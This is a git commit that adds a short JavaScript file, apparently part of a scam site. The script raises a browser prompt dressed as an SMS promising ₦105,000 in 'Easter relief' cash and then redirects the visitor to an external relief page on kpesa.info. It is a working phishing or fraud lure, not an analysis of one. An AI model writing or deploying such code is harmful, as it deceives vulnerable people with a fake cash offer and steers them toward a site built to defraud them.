7a29703e0a3ad60fcc0e545a1bf9d38399a915a1
kpesaa <meiosis_logins.2d@icloud.com>
2026-04-05 00:56:37 +0100

    Create activation11platu.js

---
+++ activation11platu.js
@@ -0,0 +1,8 @@
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₦105,000. Please press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://kpesa.info/Plateau-Easter-Relief.html';
+}
